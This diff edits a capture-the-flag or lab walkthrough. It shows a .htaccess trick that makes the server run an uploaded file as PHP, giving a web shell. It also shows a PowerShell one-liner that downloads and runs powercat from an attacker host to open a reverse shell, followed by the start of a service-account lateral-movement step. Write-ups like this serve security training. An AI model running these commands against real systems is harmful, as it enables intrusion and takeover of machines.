@@ -23,20 +23,21 @@ The server running on the machine is apache. So we could potentially upload a ".
 Make a ".htaccess" file and upload it to the server:
 echo "AddType application/x-httpd-php .xxx" > .htaccess
 The ".htaccess" file is not shown in the "/uploads" directory because it is a hidden file.
-After uploading, I could see the web shell.
-The server now renders the ".xxx" extension as PHP. And it allowed me to perform command execution.
+After uploading, I can see the web shell.
+The server now renders the ".xxx" extension as PHP, which allows me to perform command execution.
 ```
 ## Foothold
 ```
+Webshell
 I was hosting a "powercat.ps1" script on my kali port 80.
 Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.x.x/powercat.ps1');powercat -c 192.168.x.x -p 4444 -e cmd
-Executed the command through the web shell to download the "powercat.ps1" with PowerShell and run the reverse shell command.
-Now I had a shell as "svc_apache"
+Execute the command through the web shell to download the "powercat.ps1" with PowerShell and run the reverse shell command.
+Now I have a shell as "svc_apache"
 ```
 ## Lateral Movement (svc_apache -> svc_mssql)
 ```
 I need to switch to "svc_mssql" laterally to get the flag.
-SVC usually implies a service account that can request tickets. But first, I need to get a list of service principal names of the machine.
+SVC usually implies a service account which can request tickets. First, I need to get a list of service principal names of the machine.
 ```
 ## Get SPNs (Service Principal Names)
 ```
